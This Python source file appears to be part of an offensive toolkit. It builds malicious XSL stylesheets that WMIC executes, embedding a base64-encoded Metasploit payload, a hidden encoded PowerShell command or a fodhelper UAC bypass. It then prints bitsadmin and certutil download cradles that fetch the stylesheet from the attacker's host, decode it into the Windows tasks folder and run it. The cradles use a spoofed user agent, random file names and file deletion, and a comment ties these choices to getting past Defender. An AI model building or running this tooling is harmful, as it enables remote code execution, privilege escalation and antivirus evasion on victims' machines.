import os
import base64
import argparse
from random import choice
from makefodhelper import writefodhelper
from makerunner import gen,runner,cradleps1,powershell_b64encode
from makerunspace import certutil_b64encode

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writexsl(bitness,pformat,uacbypass,lhost,pscmd):
    if uacbypass == "0":
        runfilename = "run.xsl"
        if pscmd == "0":
            upper = ""
            lower = "ICAgICAgICAgICAgby5nb2dvKHNjKTsKICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgIGRlYnVnKGUubWVzc2FnZSk7CiAgICAgICAgfQogICAgICAgIF1dPgogICAgPC9tczpzY3JpcHQ+Cjwvc3R5bGVzaGVldD4="

            msffilename = "met%s.%s" % (bitness,pformat)
            m = open(msffilename,'rb')
            msf = m.read()
            msf_b64 = base64.b64encode(msf).decode()
            data = "var sc = \"%s\"" % msf_b64
        else:
            upper = "PD94bWwgdmVyc2lvbj0nMS4wJz8+CjxzdHlsZXNoZWV0IHZlcnNpb249IjEuMCIKICAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIAogICAgeG1sbnM6bXM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206eHNsdCIgCiAgICB4bWxuczp1c2VyPSJodHRwOi8vbXljb21wYW55LmNvbS9teW5hbWVzcGFjZSI+Cgo8b3V0cHV0IG1ldGhvZD0idGV4dCIvPgogICAgPG1zOnNjcmlwdCBpbXBsZW1lbnRzLXByZWZpeD0idXNlciIgbGFuZ3VhZ2U9IkpTY3JpcHQiPgogICAgICAgIDwhW0NEQVRBWw=="
            lower = "ICAgICAgICBdXT4KICAgIDwvbXM6c2NyaXB0Pgo8L3N0eWxlc2hlZXQ+"
            pscmd = "powershell -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(pscmd) 
            data = "var shell = new ActiveXObject(\"WScript.Shell\"); var res = shell.Run(\"%s\");" % pscmd

    if uacbypass == "1":
        upper = ""
        lower = "ICAgICAgICAJby5nb2dvKHNjKTsKICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgIGRlYnVnKGUubWVzc2FnZSk7CiAgICAgICAgfQogICAgICAgIF1dPgogICAgPC9tczpzY3JpcHQ+Cjwvc3R5bGVzaGVldD4="

        runfilename = "uac.xsl"

        fodfilename,cmdstring_b64 = writefodhelper(lhost,"exe")
        data = "var sc = \"%s\"" % cmdstring_b64

    with open(runfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("            " + data + "\n")
        f.write(lower)
    
    f.close()
    print ('[+] %s written' % runfilename)
    copy(runfilename,"/var/www/html/",runfilename)
    return runfilename
    pass

def makexsl(bitness,pformat,uacbypass,lhost,pscmd):
    if uacbypass == "0":
        if pscmd == "0":
            gen(lhost,lport,bitness,pformat)
    if uacbypass == "1":
        runner(lhost,lport,bitness)

    bitsjobname = rand_word()
    randtxtname = "%s.txt" % rand_word()
    randxslname = "%s.xsl" % rand_word()
    runfilename = writexsl(bitness,pformat,uacbypass,lhost,pscmd)
    runwebroot = "/var/www/html/"
    loadpath_met = "c:\\\\windows\\\\tasks\\\\%s"
    loadpath_cmd = loadpath_met.replace("\\\\","\\")
    utilpath = 'wmic process get brief /format:\"%s\"'
    certutilcombo = "bitsadmin /Transfer myJob http://%s/%s %s && certutil -decode %s %s"
    if custom_agent == "0":
        certutilcombo_sub = "bitsadmin /Transfer %s http://%s/%s %s && del %s && certutil -decode %s %s"
    if custom_agent == "1":
        certutilcombo_sub = "bitsadmin /create /download %s && bitsadmin /setcustomheaders %s User-Agent:\"%s\" && bitsadmin /addFile %s http://%s/%s %s && bitsadmin /resume %s && ping 127.0.0.1 -n 10 > nul && bitsadmin /complete %s && del %s && certutil -decode %s %s"
    if proxy_steal == "1":
        certutilcombo_sub = "bitsadmin /util /setieproxy networkservice AUTODETECT && " + certutilcombo_sub

    certfilename = certutil_b64encode(runwebroot+runfilename)
    certfilepath_met = loadpath_met % randtxtname #certfilename
    certfilepath_cmd = loadpath_cmd % randtxtname #certfilename
    runfileroot = runwebroot + runfilename
    runfilepath_met = loadpath_met % randxslname #runfilename
    runfilepath_cmd = loadpath_cmd % randxslname #runfilename

    combo_one = certutilcombo % (lhost,certfilename,certfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "0":
        combo_one_sub = certutilcombo_sub % (bitsjobname,lhost,certfilename,certfilepath_cmd,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "1":
        combo_one_sub = certutilcombo_sub % (bitsjobname,bitsjobname,agent_string,bitsjobname,lhost,certfilename,certfilepath_cmd,bitsjobname,bitsjobname,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    combo_two = utilpath % (runfilepath_cmd)
    combo_break = combo_one + " && " + combo_two
    combo_break_sub = combo_one_sub + " && " + combo_two

    copy(certfilename,runwebroot,certfilename)
    print('[*] upload:\nupload %s %s' % (runfileroot,runfilepath_met)) 
    print(combo_one)
    print(combo_one_sub)
    print('[*] check:\ndir %s' % (runfilepath_cmd))
    print('[*] use:\n%s ' % (combo_two))
    print('[!] c-c-c-combo breaker (cmd only!) (sub):\n%s' % combo_break_sub) 

    return combo_break,combo_break_sub

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--uac','-u',required=False,dest='uacbypass',help='uacbypass 0 or 1')
    parser.add_argument('--cmd','-c',required=False,dest='pscmd',help='arbitrary powershell command, only use with -t ps1!')    
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    uacbypass = args.uacbypass
    pscmd = args.pscmd

    if uacbypass != "1":
        uacbypass = "0"

    if pscmd == None:
        pscmd = "0"

    pformat = "raw" #is raw - uses almost same code as dntjs

    makexsl(bitness,pformat,uacbypass,lhost,pscmd)